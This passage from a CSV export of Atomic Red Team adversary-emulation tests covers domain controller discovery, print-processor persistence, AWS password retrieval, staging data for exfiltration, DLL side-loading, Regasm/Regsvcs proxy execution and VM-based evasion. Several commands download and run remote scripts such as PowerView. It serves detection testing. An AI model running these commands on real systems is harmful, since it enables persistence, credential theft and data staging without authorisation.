Upon successful execution a listing of computers will output with their paths in AD.
Reference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/
",windows,,,"([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()
",powershell,False,,,,,
T1018,Remote System Discovery,Get-DomainController with PowerView,b9d2e8ca-5520-4737-8076-4f08913da2c4,"Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose
",powershell,,,,,,
T1018,Remote System Discovery,Get-WmiObject to Enumerate Domain Controllers,e3cf5123-f6c9-4375-bdf2-1bb3ba43a1ad,"The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.
Upon successful execution a listing of Systems from AD will output with their paths.
Reference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1
",windows,,,"try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop }
catch { $_; exit $_.Exception.HResult }
",powershell,False,,,,,
T1018,Remote System Discovery,Remote System Discovery - net group Domain Controller,5843529a-5056-4bc1-9c13-a311e2af4ca0,"Identify remote systems with net.exe querying the Active Directory Domain Controller.
Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the ""Domain Controller"" in the domain. Output will be via stdout.
",windows,,,"net group /domain ""Domain controllers""
",command_prompt,,,,,,
T1547.012,Boot or Logon Autostart Execution: Print Processors,Print Processors,f7d38f47-c61b-47cc-a59d-fc0368f47ed0,"Establishes persistence by creating a new print processor registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors.
The new print processor will point to a DLL which will be loaded by the spooler service after a reboot. The DLL will then create the file AtomicTest.txt in C:\Users\Public\ as validation that the test is successful.

Note: The test assumes a x64 Windows operating system.

The payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)
",windows,,,"if( $(get-service -Name spooler).StartType -eq ""Disabled"") {Set-Service -Name ""spooler"" -StartupType Automatic}
net stop spooler
Copy-Item ""$PathToAtomicsFolder\T1547.012\bin\AtomicTest.dll"" C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll
reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" /v ""Driver"" /d ""AtomicTest.dll"" /t REG_SZ /f
net start spooler
if(#{restart}){
  Restart-Computer
}
",powershell,True,,"net stop spooler
rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue
rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue
remove-item ""HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\AtomicRedTeam"" -Force -ErrorAction SilentlyContinue
net start spooler
",,,"input_arguments.restart.description: set to 1 if you want the computer to reboot as part of the test

input_arguments.restart.type: integer

input_arguments.restart.default: 0

"
T1552,Unsecured Credentials,AWS - Retrieve EC2 Password Data using stratus,a21118de-b11e-4ebd-b655-42f11142df0c,"This atomic runs an API call GetPasswordData from a role that does not have permission to do so. This simulates an attacker attempting to retrieve RDP passwords on a high number of Windows EC2 instances. This atomic test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/
",linux,macos,iaas:aws,"export AWS_REGION=#{aws_region} 
cd #{stratus_path}
echo ""starting warmup""
./stratus warmup aws.credential-access.ec2-get-password-data
echo ""starting detonate""
./stratus detonate aws.credential-access.ec2-get-password-data --force
",sh,False,,"export AWS_REGION=#{aws_region}
echo ""Cleanup detonation""
cd #{stratus_path}
./stratus cleanup --all
rm -rf stratus*
",sh,"dependencies.0.description: Stratus binary must be present at the (#{stratus_path}/stratus)

dependencies.0.prereq_command: if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ ""$(uname)"" == ""Darwin"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '""' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
elif [ ""$(expr substr $(uname) 1 5)"" == ""Linux"" ]
then DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Linux_x86_64 | cut -d '""' -f 4) 
  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL
  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/
fi

dependencies.1.description: Check if ~/.aws/credentials file has a default stanza is configured

dependencies.1.prereq_command: cat ~/.aws/credentials | grep ""default""

dependencies.1.get_prereq_command: echo Please install the aws-cli and configure your AWS defult profile using: aws configure

","input_arguments.stratus_path.description: Path of stratus binary

input_arguments.stratus_path.type: path

input_arguments.stratus_path.default: $PathToAtomicsFolder/T1552/src

input_arguments.aws_region.description: AWS region to detonate

input_arguments.aws_region.type: string

input_arguments.aws_region.default: us-west-2

"
T1560.001,Archive Collected Data: Archive via Utility,Compress Data for Exfiltration With Rar,02ea31cb-3b4c-4a2d-9bf1-e4e70ebcf5d0,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.
When the test completes you should find the txt files from the %USERPROFILE% directory compressed in a file called T1560.001-data.rar in the %USERPROFILE% directory 
",windows,,,"""#{rar_exe}"" a -r #{output_file} #{input_path}\*#{file_extension}
",command_prompt,False,,"del /f /q /s #{output_file} >nul 2>&1
",,"dependencies.0.description: Rar tool must be installed at specified location (#{rar_exe})

dependencies.0.prereq_command: if not exist ""#{rar_exe}"" (exit /b 1)

dependencies.0.get_prereq_command: echo Downloading Winrar installer
bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" #{rar_installer}
#{rar_installer} /S

","input_arguments.input_path.description: Path that should be compressed into our output file

input_arguments.input_path.type: path

input_arguments.input_path.default: %USERPROFILE%

input_arguments.file_extension.description: Extension of files to compress

input_arguments.file_extension.type: string

input_arguments.file_extension.default: .txt

input_arguments.output_file.description: Path where resulting compressed data should be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: %USERPROFILE%\T1560.001-data.rar

input_arguments.rar_installer.description: Winrar installer

input_arguments.rar_installer.type: path

input_arguments.rar_installer.default: %TEMP%\winrar.exe

input_arguments.rar_exe.description: The RAR executable from Winrar

input_arguments.rar_exe.type: path

input_arguments.rar_exe.default: %programfiles%/WinRAR/Rar.exe

"
T1560.001,Archive Collected Data: Archive via Utility,Compress Data and lock with password for Exfiltration with winrar,8dd61a55-44c6-43cc-af0c-8bdda276860c,"Note: Requires winrar installation
rar a -p""blue"" hello.rar (VARIANT)
",windows,,,"mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""#{rar_exe}"" a -hp""blue"" hello.rar
dir
",command_prompt,False,,,,"dependencies.0.description: Rar tool must be installed at specified location (#{rar_exe})

dependencies.0.prereq_command: if not exist ""#{rar_exe}"" (exit /b 1)

dependencies.0.get_prereq_command: echo Downloading Winrar installer
bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.win-rar.com/fileadmin/winrar-versions/winrar/th/winrar-x64-580.exe"" #{rar_installer}
#{rar_installer} /S

","input_arguments.rar_installer.description: Winrar installer

input_arguments.rar_installer.type: path

input_arguments.rar_installer.default: %TEMP%\winrar.exe

input_arguments.rar_exe.description: The RAR executable from Winrar

input_arguments.rar_exe.type: path

input_arguments.rar_exe.default: %programfiles%/WinRAR/Rar.exe

"
T1560.001,Archive Collected Data: Archive via Utility,Compress Data and lock with password for Exfiltration with winzip,01df0353-d531-408d-a0c5-3161bf822134,"Note: Requires winzip installation
wzzip sample.zip -s""blueblue"" *.txt (VARIANT)
",windows,,,"path=%path%;""C:\Program Files (x86)\winzip""
mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""#{winzip_exe}"" -min -a -s""hello"" archive.zip *
dir
",command_prompt,False,,,powershell,"dependencies.0.description: Winzip must be installed

dependencies.0.prereq_command: cmd /c 'if not exist ""#{winzip_exe}"" (echo 1) else (echo 0)'

dependencies.0.get_prereq_command: IEX(IWR ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1"" -UseBasicParsing)
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
if(Invoke-WebRequestVerifyHash ""#{winzip_url}"" ""PathToAtomicsFolder\..\ExternalPayloads\winzip.exe"" #{winzip_hash}){
  Write-Host Follow the installation prompts to continue
  cmd /c ""PathToAtomicsFolder\..\ExternalPayloads\winzip.exe""
}

","input_arguments.winzip_exe.description: Path to installed Winzip executable

input_arguments.winzip_exe.type: path

input_arguments.winzip_exe.default: %ProgramFiles%\WinZip\winzip64.exe

input_arguments.winzip_url.description: Path to download Windows Credential Editor zip file

input_arguments.winzip_url.type: url

input_arguments.winzip_url.default: https://download.winzip.com/gl/nkln/winzip24-home.exe

input_arguments.winzip_hash.description: File hash of the Windows Credential Editor zip file

input_arguments.winzip_hash.type: string

input_arguments.winzip_hash.default: B59DB592B924E963C21DA8709417AC0504F6158CFCB12FE5536F4A0E0D57D7FB

"
T1560.001,Archive Collected Data: Archive via Utility,Compress Data and lock with password for Exfiltration with 7zip,d1334303-59cb-4a03-8313-b3e24d02c198,"Note: This test requires 7zip installation
",windows,,,"mkdir $PathToAtomicsFolder\T1560.001\victim-files
cd $PathToAtomicsFolder\T1560.001\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""#{7zip_exe}"" u archive.7z *txt -pblue
dir
",command_prompt,False,,"rmdir /s /Q $PathToAtomicsFolder\T1560.001\victim-files >nul 2>&1
",,"dependencies.0.description: 7zip tool must be installed at specified location (#{7zip_exe})

dependencies.0.prereq_command: if not exist ""#{7zip_exe}"" (exit /b 1)

dependencies.0.get_prereq_command: echo Downloading 7-zip installer
bitsadmin /transfer myDownloadJob /download /priority normal ""https://www.7-zip.org/a/7z2301-x64.exe"" #{7zip_installer}
#{7zip_installer} /S

","input_arguments.7zip_installer.description: 7zip installer

input_arguments.7zip_installer.type: path

input_arguments.7zip_installer.default: %TEMP%\7zip.exe

input_arguments.7zip_exe.description: Path to installed 7zip executable

input_arguments.7zip_exe.type: path

input_arguments.7zip_exe.default: %ProgramFiles%\7-zip\7z.exe

"
T1560.001,Archive Collected Data: Archive via Utility,Data Compressed - nix - zip,c51cec55-28dd-4ad2-9461-1eacbc82c3a0,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard zip compression.
",linux,macos,,"zip #{output_file} #{input_files}
",sh,False,,"rm -f #{output_file}
",,"dependencies.0.description: Files to zip must exist (#{input_files})

dependencies.0.prereq_command: if [ $(ls #{input_files} | wc -l) > 0 ] && [ -x $(which zip) ] ; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: (which yum && yum -y install epel-release zip)||(which apt-get && apt-get install -y zip)
echo Please set input_files argument to include files that exist

","input_arguments.input_files.description: Path that should be compressed into our output file, may include wildcards

input_arguments.input_files.type: path

input_arguments.input_files.default: /var/log/{w,b}tmp

input_arguments.output_file.description: Path that should be output as a zip archive

input_arguments.output_file.type: path

input_arguments.output_file.default: $HOME/data.zip

"
T1560.001,Archive Collected Data: Archive via Utility,Data Compressed - nix - gzip Single File,cde3c2af-3485-49eb-9c1f-0ed60e9cc0af,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.
",linux,macos,,"test -e #{input_file} && gzip -k #{input_file} || (echo '#{input_content}' >> #{input_file}; gzip -k #{input_file})
",sh,False,,"rm -f #{input_file}.gz
",,,"input_arguments.input_file.description: Path that should be compressed

input_arguments.input_file.type: path

input_arguments.input_file.default: $HOME/victim-gzip.txt

input_arguments.input_content.description: contents of compressed files if file does not already exist. default contains test credit card and social security number

input_arguments.input_content.type: string

input_arguments.input_content.default: confidential! SSN: 078-05-1120 - CCN: 4000 1234 5678 9101

"
T1560.001,Archive Collected Data: Archive via Utility,Data Compressed - nix - tar Folder or File,7af2b51e-ad1c-498c-aca8-d3290c19535a,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration. This test uses standard gzip compression.
",linux,macos,,"tar -cvzf #{output_file} #{input_file_folder}
",sh,False,,"rm -f #{output_file}
",,"dependencies.0.description: Folder to zip must exist (#{input_file_folder})

dependencies.0.prereq_command: test -e #{input_file_folder}

dependencies.0.get_prereq_command: mkdir -p #{input_file_folder} && touch #{input_file_folder}/file1

","input_arguments.input_file_folder.description: Path that should be compressed

input_arguments.input_file_folder.type: path

input_arguments.input_file_folder.default: $HOME/$USERNAME

input_arguments.output_file.description: File that should be output

input_arguments.output_file.type: path

input_arguments.output_file.default: $HOME/data.tar.gz

"
T1560.001,Archive Collected Data: Archive via Utility,Data Encrypted with zip and gpg symmetric,0286eb44-e7ce-41a0-b109-3da516e05a5f,"Encrypt data for exiltration
",linux,macos,,"mkdir -p #{test_folder}
cd #{test_folder}; touch a b c d e f g
zip --password ""#{encryption_password}"" #{test_folder}/#{test_file} ./*
echo ""#{encryption_password}"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip
ls -l #{test_folder}
",sh,False,,"rm -Rf #{test_folder}
",sh,"dependencies.0.description: gpg and zip are required to run the test.
dependencies.0.prereq_command: if [ ! -x ""$(command -v gpg)"" ] || [ ! -x ""$(command -v zip)"" ]; then exit 1; fi;

dependencies.0.get_prereq_command: (which pkg && pkg install -y gnupg zip)||(which yum && yum -y install epel-release zip gpg)||(which apt-get && apt-get install -y zip gpg)

","input_arguments.test_folder.description: Path used to store files.

input_arguments.test_folder.type: path

input_arguments.test_folder.default: /tmp/T1560

input_arguments.test_file.description: Temp file used to store encrypted data.

input_arguments.test_file.type: path

input_arguments.test_file.default: T1560

input_arguments.encryption_password.description: Password used to encrypt data.

input_arguments.encryption_password.type: string

input_arguments.encryption_password.default: InsertPasswordHere

"
T1560.001,Archive Collected Data: Archive via Utility,Encrypts collected data with AES-256 and Base64,a743e3a6-e8b2-4a30-abe7-ca85d201b5d3,"An adversary may compress all the collected data, encrypt and send them to a C2 server using base64 encoding. 
This atomic test tries to emulate the behaviour of the FLEXIROOT backdoor to archive the collected data. FLEXIROOT typically utilizes AES encryption and base64 encoding to transfer the encrypted data to the C2 server. 
In this test, standard zip compression and the OpenSSL library are used to encrypt the compressed data.
https://attack.mitre.org/versions/v7/software/S0267/",linux,macos,,"zip -r  #{input_folder}/#{input_file}.zip #{input_folder}
openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc 
cat #{input_folder}/#{input_file}.enc | base64",bash,False,,rm -rf #{input_folder},bash,"dependencies.0.description: The folder and test files must exist
dependencies.0.prereq_command: if [ ! -d #{input_folder} ]; then exit 1; else exit 0; fi;
dependencies.0.get_prereq_command: if [ ! -d #{input_folder} ]; then mkdir -p #{input_folder}; cd #{input_folder}; touch {a..z}.data; fi;
","input_arguments.input_folder.description: Path to the folder used to store the test files

input_arguments.input_folder.type: path

input_arguments.input_folder.default: /tmp/t1560

input_arguments.input_file.description: Name of the compressed and encrypted files

input_arguments.input_file.type: string

input_arguments.input_file.default: t1560_data

input_arguments.enc_pass.description: Password used to encrypt the data

input_arguments.enc_pass.type: string

input_arguments.enc_pass.default: atomic_enc_pass

"
T1574.002,Hijack Execution Flow: DLL Side-Loading,DLL Side-Loading using the Notepad++ GUP.exe binary,65526037-7079-44a9-bda1-2cb624838040,"GUP is an open source signed binary used by Notepad++ for software updates, and is vulnerable to DLL Side-Loading, thus enabling the libcurl dll to be loaded.
Upon execution, calc.exe will be opened.
",windows,,,"""#{gup_executable}""
",command_prompt,,,"taskkill /F /IM #{process_name} >nul 2>&1
",powershell,"dependencies.0.description: Gup.exe binary must exist on disk at specified location (#{gup_executable})

dependencies.0.prereq_command: if (Test-Path ""#{gup_executable}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{gup_executable}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/GUP.exe?raw=true"" -OutFile ""#{gup_executable}""

","input_arguments.process_name.description: Name of the created process

input_arguments.process_name.type: string

input_arguments.process_name.default: calculator.exe

input_arguments.gup_executable.description: GUP is an open source signed binary used by Notepad++ for software updates

input_arguments.gup_executable.type: path

input_arguments.gup_executable.default: PathToAtomicsFolder\T1574.002\bin\GUP.exe

"
T1574.002,Hijack Execution Flow: DLL Side-Loading,DLL Side-Loading using the dotnet startup hook environment variable,d322cdd7-7d60-46e3-9111-648848da7c02,"Utilizing the dotnet_startup_hooks environment variable, this method allows for registering a global method in an assembly that will be executed whenever a .net core application is started. This unlocks a whole range of scenarios, from injecting a profiler to tweaking a static context in a given environment. [blog post](https://medium.com/criteo-engineering/c-have-some-fun-with-net-core-startup-hooks-498b9ad001e1)
",windows,,,"set DOTNET_STARTUP_HOOKS=""#{preloader_dll}""
dotnet -h > nul
echo.
",command_prompt,,,"taskkill /F /IM #{process_name} >nul 2>&1
",powershell,"dependencies.0.description: .Net SDK must be installed

dependencies.0.prereq_command: if (Test-Path ""C:\Program Files\dotnet\dotnet.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: winget install Microsoft.DotNet.SDK.6 --accept-source-agreements --accept-package-agreements -h > $null
echo.

dependencies.1.description: preloader must exist

dependencies.1.prereq_command: if (Test-Path ""#{preloader_dll}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.002/bin/preloader?raw=true"" -OutFile ""#{preloader_dll}""

","input_arguments.process_name.description: Name of the created process

input_arguments.process_name.type: string

input_arguments.process_name.default: calculator.exe

input_arguments.preloader_dll.description: library for interfacing with the dotnet framework

input_arguments.preloader_dll.type: path

input_arguments.preloader_dll.default: PathToAtomicsFolder\T1574.002\bin\preloader.dll

"
T1218.009,Signed Binary Proxy Execution: Regsvcs/Regasm,Regasm Uninstall Method Call Test,71bfbfac-60b1-4fc0-ac8b-2cedbbdcb112,"Executes the Uninstall Method, No Admin Rights Required. Upon execution, ""I shouldn't really execute either."" will be displayed.
",windows,,,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library ""#{source_file}""
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U #{output_file}
",command_prompt,,,"del #{output_file} >nul 2>&1
",powershell,"dependencies.0.description: The CSharp source file must exist on disk at specified location (#{source_file})

dependencies.0.prereq_command: if (Test-Path ""#{source_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{source_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs"" -OutFile ""#{source_file}""

","input_arguments.output_file.description: Location of the payload

input_arguments.output_file.type: path

input_arguments.output_file.default: %tmp%\T1218.009.dll

input_arguments.source_file.description: Location of the CSharp source_file

input_arguments.source_file.type: path

input_arguments.source_file.default: PathToAtomicsFolder\T1218.009\src\T1218.009.cs

"
T1218.009,Signed Binary Proxy Execution: Regsvcs/Regasm,Regsvcs Uninstall Method Call Test,fd3c1c6a-02d2-4b72-82d9-71c527abb126,"Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, ""I shouldn't really execute"" will be displayed
along with other information about the assembly being installed.
",windows,,,"$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content $env:Temp\key.snk -Value $Content -Encoding Byte
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /out:""#{output_file}"" /target:library /keyfile:$env:Temp\key.snk #{source_file}
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe #{output_file}
",powershell,True,,"Remove-Item #{output_file} -ErrorAction Ignore | Out-Null
$parentpath = Split-Path -Path ""#{output_file}""
Remove-Item $parentpath\key.snk -ErrorAction Ignore | Out-Null
Remove-Item $parentpath\T1218.009.tlb -ErrorAction Ignore | Out-Null
",powershell,"dependencies.0.description: The CSharp source file must exist on disk at specified location (#{source_file})

dependencies.0.prereq_command: if (Test-Path ""#{source_file}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{source_file}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.009/src/T1218.009.cs"" -OutFile ""#{source_file}""

","input_arguments.output_file.description: Location of the payload

input_arguments.output_file.type: path

input_arguments.output_file.default: $Env:TEMP\T1218.009.dll

input_arguments.source_file.description: Location of the CSharp source_file

input_arguments.source_file.type: path

input_arguments.source_file.default: PathToAtomicsFolder\T1218.009\src\T1218.009.cs

"
T1564.006,Run Virtual Instance,Register Portable Virtualbox,c59f246a-34f8-4e4d-9276-c295ef9ba0dd,"ransomware payloads via virtual machines (VM). 
[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)
",windows,,,"""C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe"" /reregserver
regsvr32 /S ""C:\Program Files\Oracle\VirtualBox\VboxC.dll""
rundll32 ""C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init""
sc create VBoxDRV binpath= ""C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys"" type= kernel start= auto error= normal displayname= PortableVBoxDRV
sc start VBoxDRV
",command_prompt,,,"sc stop VBoxDRV
sc delete VBoxDRV
regsvr32 /u /S ""C:\Program Files\Oracle\VirtualBox\VboxC.dll""
msiexec /x ""#{msi_file_path}"" /qn
",powershell,"dependencies.0.description: MSI file must exist on disk at specified location (#{msi_file_path})

dependencies.0.prereq_command: if (Test-Path ""#{msi_file_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{msi_file_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/Virtualbox_52.msi"" -OutFile ""#{msi_file_path}""

dependencies.1.description: CAB file must exist on disk at specified location (#{cab_file_path})

dependencies.1.prereq_command: if (Test-Path ""#{cab_file_path}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory (split-path ""#{cab_file_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1564.006/bin/common.cab"" -OutFile ""#{cab_file_path}"" 

dependencies.2.description: Old version of Virtualbox must be installed

dependencies.2.prereq_command: if (Test-Path ""C:\Program Files\Oracle\VirtualBox\VboxC.dll"") {exit 0} else {exit 1}

dependencies.2.get_prereq_command: msiexec /i ""#{msi_file_path}"" /qn

","input_arguments.msi_file_path.description: Path to the MSI file

input_arguments.msi_file_path.type: path

input_arguments.msi_file_path.default: PathToAtomicsFolder\T1564.006\bin\Virtualbox_52.msi

input_arguments.cab_file_path.description: Path to the CAB file

input_arguments.cab_file_path.type: path

input_arguments.cab_file_path.default: PathToAtomicsFolder\T1564.006\bin\common.cab

"
T1564.006,Run Virtual Instance,Create and start VirtualBox virtual machine,88b81702-a1c0-49a9-95b2-2dd53d755767,"Create a simple VirtualBox VM and start up the machine
Cleanup command stops and deletes the newly created VM and associated files
https://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm
https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/
https://attack.mitre.org/techniques/T1564/006/
",windows,,,"""#{vboxmanage_exe}"" createvm --name ""#{vm_name}"" --register
""#{vboxmanage_exe}"" modifyvm ""#{vm_name}"" --firmware efi
""#{vboxmanage_exe}"" startvm ""#{vm_name}""
",command_prompt,False,,"""#{vboxmanage_exe}"" controlvm ""#{vm_name}"" poweroff
""#{vboxmanage_exe}"" unregistervm ""#{vm_name}"" --delete",powershell,"dependencies.0.description: VirtualBox must exist on disk at specified locations (#{virtualbox_exe})

dependencies.0.prereq_command: if (Test-Path ""#{virtualbox_exe}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
$wc = New-Object System.Net.WebClient
$wc.DownloadFile(""#{virtualbox_download}"",""PathToAtomicsFolder\..\ExternalPayloads\#{virtualbox_installer}"")
start-process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\#{virtualbox_installer}"" -ArgumentList ""--silent"" -Wait

dependencies.1.description: VBoxManage must exist on disk at specified locations (#{vboxmanage_exe})

dependencies.1.prereq_command: if (Test-Path ""#{vboxmanage_exe}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: $wc = New-Object System.Net.WebClient
$wc.DownloadFile(""#{virtualbox_download}"",""PathToAtomicsFolder\..\ExternalPayloads\#{virtualbox_installer}"")
start-process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\#{virtualbox_installer}"" -ArgumentList ""--silent"" -Wait

","input_arguments.vm_name.description: Name of the new virtual machine

input_arguments.vm_name.type: string

input_arguments.vm_name.default: Atomic VM

input_arguments.virtualbox_exe.description: Path to the VirtualBox executable

input_arguments.virtualbox_exe.type: path

input_arguments.virtualbox_exe.default: C:\Program Files\Oracle\VirtualBox\VirtualBox.exe

input_arguments.vboxmanage_exe.description: Path to the executable for VBoxManage, the command-line interface to VirtualBox

input_arguments.vboxmanage_exe.type: path

input_arguments.vboxmanage_exe.default: C:\Program Files\Oracle\VirtualBox\VBoxManage.exe

input_arguments.virtualbox_download.description: URL for the current installer for the Windows version of VirtualBox, as of March 2022

input_arguments.virtualbox_download.type: url

input_arguments.virtualbox_download.default: https://download.virtualbox.org/virtualbox/6.1.32/VirtualBox-6.1.32-149290-Win.exe

input_arguments.virtualbox_installer.description: Executable for the Virtualbox installer

input_arguments.virtualbox_installer.type: string

input_arguments.virtualbox_installer.default: VirtualBox-6.1.32-149290-Win.exe

"
T1564.006,Run Virtual Instance,Create and start Hyper-V virtual machine,fb8d4d7e-f5a4-481c-8867-febf13f8b6d3,"Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine
Cleanup command stops and deletes the newly created VM
https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v
https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/
https://attack.mitre.org/techniques/T1564/006/
",windows,,,"$VM = ""#{vm_name}""
New-VM -Name $VM -Generation 2
Set-VMFirmware $VM -EnableSecureBoot Off
Start-VM $VM",powershell,True,,"Stop-VM $VM -Force
Remove-VM $VM -Force",,"dependencies.0.description: Hyper-V must be enabled on the system
Checks whether Hyper-V is enabled. If not, enables Hyper-V and forces a required restart

dependencies.0.prereq_command: if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V).State = ""Enabled"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force

","input_arguments.vm_name.description: Name of the new virtual machine

input_arguments.vm_name.type: string

input_arguments.vm_name.default: Atomic VM

"
